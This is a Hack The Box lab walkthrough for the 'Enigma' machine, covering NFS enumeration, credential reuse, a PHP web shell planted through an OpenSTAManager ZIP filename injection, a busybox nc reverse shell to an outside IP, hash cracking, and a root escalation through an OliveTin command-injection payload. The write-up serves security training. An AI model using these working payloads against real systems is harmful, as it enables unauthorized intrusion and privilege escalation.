# Hack The Box — Enigma

Difficulty: Medium

OS: Linux

Target IP: 10.129.239.191

Domain: enigma.htb

## 1. Reconnaissance

### Port Scan

Initial enumeration was performed with `rustscan`:

```bash
rustscan -a 10.129.239.191 -- -sV -sC -oN nmap
```

The target exposed an NFS service, which became the first interesting attack surface.

## 2. NFS Enumeration

### Enumerating NFS Exports

The available NFS exports were checked with `showmount`:

```bash
showmount -e 10.129.239.191
```

Output:

```text
Export list for 10.129.239.191:
/srv/nfs/onboarding *
```

The export was accessible to any host, so it was mounted locally:

```bash
sudo mkdir -p /mnt/onboarding
sudo mount -t nfs 10.129.239.191:/srv/nfs/onboarding /mnt/onboarding
```

The mounted share contained an onboarding document:

```bash
ls -la /mnt/onboarding
```

```text
total 12
drwxr-xr-x 2 root root 4096 Feb 19  2026 .
drwxr-xr-x 4 root root 4096 Sep  7 22:03 ..
-rw-r--r-- 1 root root 1751 Feb 19  2026 New_Employee_Access.pdf
```

### Information Disclosure

The `New_Employee_Access.pdf` file contained access information for an internal mail server:

```text
URL: http://mail001.enigma.htb
Username: kevin
Password: Enigma2024!
```

The hostname was added to `/etc/hosts`:

```text
10.129.239.191 mail001.enigma.htb
```

The mail server was then accessible at:

```text
http://mail001.enigma.htb
```

## 3. Mail Enumeration

<img width="2551" height="1232" alt="Pasted image 20260908074717" src="https://github.com/user-attachments/assets/ef35ad3b-b8be-4719-b327-82e5ee776f89" />

Logging in as `kevin` revealed an onboarding email from `sarah@enigma.htb`.

The email indicated that Kevin's system access was still being arranged and that further credentials would be provided through internal communication.

A subsequent password reuse attack was used to access Sarah's account.

### OpenSTAManager Credentials

After obtaining access to Sarah's mailbox, an email from the IT department was discovered:

```text
Subject: Re: OpenSTAManager Access Request

URL: http://support_001.enigma.htb
Username: admin
Password: Ne3s4rtars78s
```

The internal OpenSTAManager instance was hosted at:

```text
http://support_001.enigma.htb
```

The hostname was added to `/etc/hosts`.

## 4. OpenSTAManager

The application was identified as OpenSTAManager version 2.9.8.

The application provided functionality for importing electronic invoices.

### Malicious Archive Upload (CVE-2025-69212) 

The invoice import functionality was vulnerable to a filename parsing issue when processing uploaded ZIP archives.

https://github.com/lukasz-rybak/CVE-2025-69212

<img width="2550" height="1126" alt="Pasted image 20260908075854" src="https://github.com/user-attachments/assets/31421abf-aee0-4949-b8b8-ecc653643050" />

A malicious ZIP archive was created with a crafted filename that resulted in a PHP file being written into the application's `files` directory.

The payload used during testing was:

```python
import zipfile

cmd = "cd files && echo '<?php system($_GET[\"c\"]); ?>' > SHELL.php"
malicious_filename = f'invoice.p7m";{cmd};echo ".p7m'

with zipfile.ZipFile('exploit.zip', 'w') as zf:
    zf.writestr(malicious_filename, b"DUMMY_P7M_CONTENT")
```

The resulting archive was uploaded through:

```text
Sales
  → Sales invoices
    → Importazione FE
```

Although the application returned an error during the import process, the uploaded file was still written to the filesystem.

### Web Shell

The uploaded PHP file could then be accessed directly:

```bash
curl "http://support_001.enigma.htb/files/SHELL.php?c=id"
```

Output:

```text
uid=33(www-data) gid=33(www-data) groups=33(www-data)
```

This confirmed Remote Code Execution as `www-data`.

```bash
curl "http://support_001.enigma.htb/files/SHELL.php?c=busybox%20nc%2010.10.15.167%204444%20-e%20sh"
```

A reverse shell was then obtained.

```bash
nc -lvnp 4444
```

The resulting shell was:

```text
uid=33(www-data) gid=33(www-data) groups=33(www-data)
```

## 5. OpenSTAManager Credential Enumeration

With access as `www-data`, the OpenSTAManager configuration files were searched for database credentials:

```bash
grep -ir "db_password" .
```

The important result was:

```text
./config.inc.php:$db_password = 'Fri3nds@9099';
```

The complete configuration contained:

```php
$db_host = 'localhost';
$db_username = 'brollin';
$db_password = 'Fri3nds@9099';
$db_name = 'openstamanager';
```

These credentials were valid for MySQL:

```bash
mysql -u brollin -p
```

After entering the recovered password:

```text
Fri3nds@9099
```

the `openstamanager` database could be accessed.

### Database Enumeration

```sql
show databases;
```

```text
+--------------------+
| Database           |
+--------------------+
| information_schema |
| openstamanager     |
| performance_schema |
+--------------------+
```

The application database was selected:

```sql
use openstamanager;
```

The `zz_users` table contained application accounts:

```sql
select * from zz_users;
```

Relevant entries:

```text
admin
haris
```

The `haris` account had a bcrypt password hash:

```text
$2y$10$WHf1T79sxjsZongUKT2jGeexTkvihBQyCZeoYXmObiNphrsZDr6eC
```

## 6. Cracking the `haris` Password

The hash format was identified as bcrypt:

```bash
hashid -m '$2y$10$WHf1T79sxjsZongUKT2jGeexTkvihBQyCZeoYXmObiNphrsZDr6eC'
```

Hashcat mode `3200` was used with `rockyou.txt`:

```bash
hashcat -m 3200 '$2y$10$WHf1T79sxjsZongUKT2jGeexTkvihBQyCZeoYXmObiNphrsZDr6eC' /usr/share/wordlists/rockyou.txt
```

The password was recovered:

```text
bestfriends
```

This provided access as the `haris` user.

## 7. Local Enumeration

After obtaining access as `haris`, local services were enumerated.

### OliveTin

Port `1337` was listening only on localhost.

```bash
curl 127.0.0.1:1337
```

The response identified the service as OliveTin.

The installed version was checked:

```bash
OliveTin --version
```

Output:

```text
INFO OliveTin is just printing the startup message
commit="d22bdeb"
date="2026-02-14T20:41:10Z"
version="3000.10.0"
```

The process was running as root:

```bash
ps aux | grep OliveTin
```

```text
root        1523  0.0  0.4 1240144 16764 ?       Ssl  22:30   0:00 /usr/local/bin/OliveTin
```

This was immediately interesting because the web service was running with root privileges.

## 8. OliveTin Configuration Analysis

The OliveTin configuration file was located at:

```text
/etc/OliveTin/config.yaml
```

### Backup Database Action

The configuration contained a `Backup Database` action:

```yaml
- title: Backup Database
  id: backup_database
  icon: "⛁"
  shell: "mysqldump -u {{ db_user }} -p'{{ db_pass }}' {{ db_name }} > /opt/backups/backup.sql"
  popupOnStart: execution-dialog
  arguments:
    - name: db_user
      type: ascii_identifier
      default: backup_svc
    - name: db_pass
      type: password
    - name: db_name
      type: ascii_identifier
      default: production
```

The important point was the use of the `password` argument type for `db_pass` and its direct interpolation into a shell command:

```text
-p'{{ db_pass }}'
```

This made the action a strong candidate for command injection .

The OliveTin configuration also showed that guest users were not required to authenticate:

authRequireGuestsToLogin: false

This setting means authentication was not required for accessing OliveTin as a guest.

Combined with:

defaultPermissions:
  view: true
  exec: true
  logs: true

the configured actions were executable without requiring a normal user login.

This was an important condition for exploitation because the vulnerable Backup Database action could be reached without first obtaining a valid OliveTin account.

## 9. OliveTin Command Injection

OliveTin version `3000.10.0` was identified as vulnerable to CVE-2026-27626.

The vulnerable `password` argument handling allowed shell metacharacters to bypass validation and reach the command execution layer.

The API endpoint used to start an action was:

```text
/api/olivetin.api.v1.OliveTinApiService/StartAction
```

The `backup_database` action was invoked with a crafted `db_pass` value.

```bash
cat > /tmp/payload.json << 'EOF'
{
  "bindingId": "backup_database",
  "arguments": [
    {"name": "db_user", "value": "backup_svc"},
    {"name": "db_pass", "value": "x' ; cp /bin/bash /tmp/aa ; chmod 4755 /tmp/aa ; #"},
    {"name": "db_name", "value": "production"}
  ]
}
EOF
```

sent it to api
```bash
curl -X POST http://127.0.0.1:1337/api/olivetin.api.v1.OliveTinApiService/StartAction \
  -H "Content-Type: application/json" \
  --data @/tmp/payload.json
```

The injected command created a SUID copy of `/bin/bash`:

```text
/tmp/aa
```

The binary was then executed:

```bash
/tmp/aa -p
```

The resulting shell confirmed root access:

```text
aa-5.2# whoami
root
```

```bash
cat /home/haris/user.txt
cat /root/root.txt
```

Root access was successfully obtained through the OliveTin command injection vulnerability.


